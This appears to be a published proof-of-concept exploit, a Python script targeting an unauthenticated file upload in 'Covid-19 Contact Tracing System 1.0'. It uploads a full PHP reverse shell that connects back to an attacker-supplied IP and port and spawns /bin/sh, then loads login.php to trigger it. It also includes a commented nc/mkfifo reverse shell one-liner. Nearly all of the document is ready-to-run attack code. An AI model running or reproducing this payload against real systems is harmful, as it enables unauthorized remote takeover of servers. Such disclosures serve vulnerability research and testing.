# Exploit Title: Covid-19 Contact Tracing System 1.0 - Remote Code Execution (Unauthenticated)
# Date: 28-02-2021
# Exploit Author: Christian Vierschilling
# Vendor Homepage: https://www.sourcecodester.com
# Software Link: https://www.sourcecodester.com/php/14728/covid-19-contact-tracing-system-web-app-qr-code-scanning-using-php-source-code.html
# Version: 1.0
# Tested on: PHP 7.4.14, Linux x64_x86

# --- Description --- #

# The web application allows for an unauthenticated file upload which can result in a Remote Code Execution.

# --- Proof of concept --- #

#!/usr/bin/python3
import random
import sys
import requests
from requests_toolbelt.multipart.encoder import MultipartEncoder

def file_upload(target_ip, attacker_ip, attacker_port):
  random_file_name = str(random.randint(1, 5)) + "revshell.php"
  #revshell_string = '<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f"); ?>'.format(attacker_ip, attacker_port)
  revshell_string = '''
  <?php
  set_time_limit (0);
$VERSION = "1.0";
$ip = \''''+ attacker_ip + '''\';
$port = '''+ attacker_port + ''';
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
  // Fork and have the parent process exit
  $pid = pcntl_fork();
  
  if ($pid == -1) {
    printit("ERROR: Can't fork");
    exit(1);
  }
  
  if ($pid) {
    exit(0);  // Parent exits
  }

  // Make the current process a session leader
  // Will only succeed if we forked
  if (posix_setsid() == -1) {
    printit("Error: Can't setsid()");
    exit(1);
  }

  $daemon = 1;
} else {
  printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
  printit("$errstr ($errno)");
  exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
  printit("ERROR: Can't spawn shell");
  exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
  // Check for end of TCP connection
  if (feof($sock)) {
    printit("ERROR: Shell connection terminated");
    break;
  }

  // Check for end of STDOUT
  if (feof($pipes[1])) {
    printit("ERROR: Shell process terminated");
    break;
  }

  // Wait until a command is end down $sock, or some
  // command output is available on STDOUT or STDERR
  $read_a = array($sock, $pipes[1], $pipes[2]);
  $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

  // If we can read from the TCP socket, send
  // data to process's STDIN
  if (in_array($sock, $read_a)) {
    if ($debug) printit("SOCK READ");
    $input = fread($sock, $chunk_size);
    if ($debug) printit("SOCK: $input");
    fwrite($pipes[0], $input);
  }

  // If we can read from the process's STDOUT
  // send data down tcp connection
  if (in_array($pipes[1], $read_a)) {
    if ($debug) printit("STDOUT READ");
    $input = fread($pipes[1], $chunk_size);
    if ($debug) printit("STDOUT: $input");
    fwrite($sock, $input);
  }

  // If we can read from the process's STDERR
  // send data down tcp connection
  if (in_array($pipes[2], $read_a)) {
    if ($debug) printit("STDERR READ");
    $input = fread($pipes[2], $chunk_size);
    if ($debug) printit("STDERR: $input");
    fwrite($sock, $input);
  }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
  if (!$daemon) {
    print "$string\n";
  }
}

?> 
  '''
  m = MultipartEncoder(fields={'name': 'HACKED2', 'img': (random_file_name, revshell_string, 'application/x-php')})
  print("(+) Uploading php reverse shell..")
  r1 = requests.post('http://{}/classes/SystemSettings.php?f=update_settings'.format(target_ip), data=m, headers={'Content-Type': m.content_type})
  if r1.text == '1':
    print("(+) File upload seems to have been successful!")
    return None
  else:
    print("(-) Oh no, the file upload seems to have failed!")
    exit()

def trigger_shell(target_ip):
  print("(+) Now trying to trigger our shell..")

  #The file we uploaded previously is expected to be an image that the web app tries to embed into the login page.
  #So by requesting the login page, our reverse shell php file will get triggered automatically. We dont even need to calculate the random bits of its new name.
  r2 = requests.get('http://{}/login.php'.format(target_ip))
  return None

def main():
  if len(sys.argv) != 4:
    print('(+) usage: %s <target ip> <attacker ip> <attacker port>' % sys.argv[0])
    print('(+) eg: %s 10.0.0.1 10.13.37.10 4444' % sys.argv[0])
    sys.exit(-1)

  target_ip = sys.argv[1]
  attacker_ip = sys.argv[2]
  attacker_port = sys.argv[3]

  file_upload(target_ip, attacker_ip, attacker_port)
  trigger_shell(target_ip)
  print("\n(+) done!")

if __name__ == "__main__":
  main()